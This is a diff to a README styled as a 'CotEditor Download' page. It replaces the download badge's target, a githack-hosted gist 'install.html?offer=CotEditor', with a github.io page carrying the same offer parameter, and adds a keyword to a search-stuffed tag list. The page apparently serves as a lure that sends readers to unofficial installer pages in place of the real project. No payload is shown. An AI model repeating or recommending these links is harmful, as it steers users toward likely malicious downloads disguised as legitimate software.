@@ -1,6 +1,6 @@
 # CotEditor Download — Desktop Text Editor
 
-[![Get CotEditor GitHub](https://img.shields.io/badge/Get%20CotEditor%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/grideradiosbabulya/72c3499081a6c8fd6b876f828268615c/raw/3701716d8486bcb942e105b564d754150492b3dc/install.html?offer=CotEditor)
+[![Get CotEditor GitHub](https://img.shields.io/badge/Get%20CotEditor%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CotEditor)
 
 ---
 
@@ -76,7 +76,7 @@ A: Absolutely, the editor allows full customization of tabs, fonts, and colors.
 
 ## 🔍 Tags
 
-CotEditor, desktop text editor, code editor, lightweight editor, syntax highlighting, programming tool, cross-platform editor, CotEditor pc, CotEditor windows, CotEditor desktop, CotEditor for mac, CotEditor for pc, CotEditor for windows, CotEditor mac 
+CotEditor, cot editor, desktop text editor, code editor, lightweight editor, syntax highlighting, programming tool, cross-platform editor, CotEditor pc, CotEditor windows, CotEditor desktop, CotEditor for mac, CotEditor for pc, CotEditor for windows, CotEditor mac 
 
 ---
 
